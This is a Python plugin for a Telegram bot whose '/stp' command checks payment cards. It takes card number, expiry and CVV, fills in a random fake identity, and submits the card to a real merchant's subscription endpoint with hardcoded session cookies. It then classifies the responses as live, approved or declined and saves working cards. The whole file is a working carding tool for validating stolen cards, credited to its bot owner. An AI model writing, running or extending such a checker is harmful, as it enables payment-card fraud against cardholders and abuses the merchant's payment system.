#https://www.gapminder.org/donations/
from values import *
import urllib.parse
import random
import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 


from datos import idchat
from datos import spam_times

@Client.on_message(filters.command(["stp"], ["/", "."]))
async def xi(_, message: Message):
    with open('plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/stp card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/stp card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Manchester
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")

            
            req = requests.get(f'https://randomuser.me/api/?nat=us')
            r = req.json()['results'][0]
            first = r['name']['first']
            last = r['name']['last']
            mail = r['email']
            
            
            
            headers = {
              'Host': 'www.lagreeod.com',
              'Accept': 'application/json, text/javascript, */*; q=0.01',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'X-Requested-With': 'XMLHttpRequest',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
              'Origin': 'https://www.lagreeod.com',
              'Sec-Fetch-Site': 'same-origin',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              'Referer': 'https://www.lagreeod.com/subscribe',
              'Accept-Language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
              'Cookie': 'ci_session=sr7ctr6q09ff9olojh3bc10rhv3iq4hl; _ga=GA1.1.19457373.1698258629; _gcl_au=1.1.155356507.1698258635; __kla_id=eyJjaWQiOiJZekZsWkRZd1ptRXRZekEyTUMwMFltWm1MVGcwTVRjdE1qZzFaakprT0RsaE5EUmsiLCIkcmVmZXJyZXIiOnsidHMiOjE2OTgyNTg2MzgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmxhZ3JlZW9kLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2OTgyNTg2MzgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmxhZ3JlZW9kLmNvbS8ifX0=; optiMonkClientId=dc03d6f5-c721-1d4d-99d6-7c6e88e4a8ae; optiMonkClient=N4IgjA7ALAHArAThALlAYwIYuAXwDQgBmAbimAGwIwBMcM5UADAQDanIVW31TUEB2AewAO7ajhxA; optiMonkSession=1698258642; _ga_4HXMJ7D3T6=GS1.1.1698258628.1.1.1698258781.0.0.0; _ga_KQ5ZJRZGQR=GS1.1.1698258636.1.1.1698258781.0.0.0'
            }
                
            
            msg1=await msg.edit(f"""<b>⎚Gateway | Manchester
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")
             
            
            
            data = {
              'stripe_customer': '',
              'subscription_type': 'Weekly Subscription',
              'firstname': first,
              'lastname': last,
              'email': mail,
              'password': 'Cesar0728',
              'card[name]': first,
              'card[number]': cc,
              'card[exp_month]': mes,
              'card[exp_year]': ano,
              'card[cvc]': cvv,
              'coupon': '',
              's1': '25',
              'sum': '38'
            }
            
            ch = requests.post('https://www.lagreeod.com/register/validate_subscribe', headers=headers, data=data)
            print(ch.text)
            
            msg2=await msg1.edit(f"""<b>⎚Gateway | Manchester
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")

            

            
            if '"success":true' in ch.text:
                status = "Approved✅"
                msg = "CVV MATCHED"
                save_live(ccs)
            elif 'Your card has insufficient funds.' in ch.text:
                status = "Approved✅"
                msg = "insufficient funds"
            elif "Your card's security code is incorrect." in ch.text:
                status = "Approved CCN✅"
                msg = "incorrect cvc"
            elif 'transaction_not_allowed' in ch.text:
                status = "Decined❌"
                msg = "transaction not allowed"
            elif 'do_not_honor' in ch.text:
                status = "Declined❌"
                msg = "Do Not Honor"
            elif 'stolen_card' in ch.text:
                status = "Declined❌"
                msg = "stolen card"
            elif 'lost_card' in ch.text:
                status = "Declined❌"
                msg = "lost_card"
            elif "pickup_card" in ch.text:
                status = "Declined❌"
                response = "Pickup Card"
            elif "incorrect_number" in ch.text:
                status = "Declined❌"
                msg = "Incorrect Card Number"
            elif "expired_card" in ch.text:
                status = "Declined❌"
                msg = "Expired Card"
            elif '"success":false' in ch.text:
                status = "Declined❌"
                msg = "Your card was declined"
            elif "fraudulent" in ch.text:
                status = "Declined❌"
                msg = "Fraudulent"
            elif "lock_timeout" in ch.text:
                status = "Declined❌"
                response = "Api Error"
            elif "Your card was declined." in ch.text:
                status = "Declined❌"
                msg = "Generic Decline"
            elif "intent_confirmation_challenge" in ch.text:
                status = "Declined❌"
                msg = "Captcha"
            elif "Your card does not support this type of purchase." in ch.text:
                status = "Live 🟡"
                msg = "Locked Card"
            elif "parameter_invalid_empty" in ch.text:
                status = "Declined❌"
                msg = "404 error"
            elif "requires_action" in ch.text:
                status = "Declined❌"
                msg = "three 3ds Secure"    
            elif "invalid_request_error" in ch.text:
                status = "Declined❌"
                msg = "404 error"
            
            else:
                status = "Declined❌"
                msg = "Gate Dead"
            
            await msg2.edit(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {msg}
⊗ GATEWAY- Manchester 
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)
            
            
            